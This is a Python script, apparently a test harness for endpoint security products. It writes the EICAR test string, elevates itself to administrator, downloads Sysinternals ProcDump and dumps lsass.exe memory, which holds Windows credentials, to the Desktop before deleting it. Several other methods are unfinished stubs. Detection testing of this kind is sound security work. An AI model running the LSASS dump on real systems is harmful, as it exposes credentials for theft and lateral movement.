import subprocess as sp
from time import sleep
import os
from zipfile import ZipFile
import shutil
import sys
import ctypes


#CS_PATH = r"C:\Windows\System32\drivers\CrowdStrike"


class EPScenario:
    def __init__(self, ps, cmd, baseDir):
        self.PS = ps
        self.CMD = cmd
        self.baseDir = baseDir


    def _get_user(self):
        _user = sp.check_output([PS, "-Command", "whoami"], text=True)
        user_lst = _user.split('\\')
        temp = user_lst[1]
        cleaned_user = temp.replace("\n", "")
        return cleaned_user
    
    def make_Eicar(self):
        # Generate EICAR file
        try:
            user = self._get_user()
            sleep(2)
            os.chdir(f"C:\\Users\\{user}\\OneDrive\\Desktop") # Remove OneDrive before push
                # EICAR file not recognized as malicious by Windows? May need to execute file.
            with open("EICAR.txt", "w") as f:
                f.write(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
            print(f"File created: EICAR.txt")

        except FileNotFoundError as e:
            print("Path not found.\n")
            path = input("Enter path manually:\n")
            os.chdir(path=path)

            with open("EICAR.txt", "w") as f:
                f.write(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")

    def cs_alerts(self):
        sp.check_output([self.CMD, "-Command", ])
        # Generate CrowdStrike alerts via cmd in proj-notes.txt
        pass

    def _dump_setup(self):
        os.makedirs(self.baseDir + "ProcDump", exist_ok=True)
        os.makedirs(self.baseDir + "Dump", exist_ok=True)
        return self.baseDir + "ProcDump"

    
    def _check_cleaned(self):
        
        files_to_delete = files_to_delete = [os.path.join(self.baseDir, f) for f in os.listdir(self.baseDir) if "dump" in f.lower()]
    
        # Collect matching filenames
        # for filename in os.listdir(dir):
        #     if "dump" in filename.lower():  # More efficient than regex here
        #         files_to_delete.append(os.path.join(dir, filename))  # Full path
        #     else:
        #         print("[-] No dump files!\n")
        #         return False
        if not files_to_delete:
            print("No files to delete!\n")
            return False
        
        sf_file = False
        sf_dir = False

        # Delete files and directories separately
        while not sf_dir and not sf_file:
            for file in files_to_delete:
                try:
                    if os.path.isdir(file):  
                        shutil.rmtree(file, ignore_errors=True)  # Delete directory
                        print(f"[+] Deleted directory: {file}\n")
                        sf_dir = True
                    elif os.path.isfile(file):  
                        os.remove(file)  # Delete file
                        print(f"[+] Deleted file: {file}\n")
                        sf_file = True
                except PermissionError as e:
                    print(f"[!] Permission denied: {file} - {e}\n")
        else:
            return True
    
    def dump_lsass(self):

        path = self._dump_setup() # Path-To-Desktop\\ProcDump
        procZip = "Procdump.zip"

        sp.run([PS, "-Command", f"""Invoke-WebRequest https://download.sysinternals.com/files/Procdump.zip -OutFile {self.baseDir}Procdump.zip"""] ,shell=True, text=True)
        joined_path = self.baseDir+procZip
    
        with ZipFile(joined_path, "r") as procObject:
            procObject.extractall(path=path)
        sleep (2)
 #       try:
        args = f"""Start-Process -FilePath '{path}\\procdump64.exe' -ArgumentList '-accepteula -ma lsass.exe {self.baseDir}\\Dump\\lsass.dmp' -Verb RunAs"""
        sp.run([PS, "-Command", args], shell=True, text=True)

        # sp.call([PS, "-Command", r"""-ArgumentList @({}\\ .\procdump64.exe -accepteula -ma lsass.exe {}Dump\\lsass.dmp)) -Verb RunAs""".format(path, self.baseDir)], shell=True , text=True)
        
        print("Initialized ProcDump in Dump directory!\n")
        print(f"Lsass.dmp created at: {self.baseDir}\\Dump..\nStarting cleanup.....\n")

        cleaned_success = self._check_cleaned()

        if cleaned_success:
                print("Cleaning done!\n")
        else:
            print("Cleaning files failed!\n")
        # except PermissionError as e:
        #     print("Execution failed.\nCleaning up..\n")
        #     if self._check_cleaned():
        #         print("Cleaned.\n")
        #         os.listdir(self.baseDir)


        # Use procdump (sysInternals) to dump lsass.exe

    def _check_S_solutions(self):
        # Check whether Cisco AMP, Symantec, or CrowdStrike is present on the EP.
        pass

    def download_files(self):
        # Based on the previous function, define ways to extract said files mentioned in notes.
        pass

    def surf_limits(self):
        # Check default browser, 
        pass

def is_admin():
    """Returns True if script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if __name__ == '__main__':
    PS = os.path.expandvars(r"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe")
    CMD = os.path.expandvars(r"%SystemRoot%\system32\cmd.exe")
    
    if not is_admin():
        print("[!] Relaunching with Admin privileges...")
        script = os.path.abspath(sys.argv[0])  # Get absolute path
        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])  # Properly format arguments

        # Ensure Python executable is used correctly
        python_exe = sys.executable  # Gets the correct Python interpreter

        # Relaunch with admin privileges
        sp.run([
            "powershell", "-Command",
            f"Start-Process -FilePath '{python_exe}' -ArgumentList '{script} {params}' -Verb RunAs"
            ])
        sys.exit()

    print("[*] Running with Administrator privileges.")
    desktopPath = os.path.expandvars(r"%USERPROFILE%\Desktop\\")
    EP_obj1 = EPScenario(ps=PS, cmd=CMD, baseDir=desktopPath)
    EP_obj1.dump_lsass()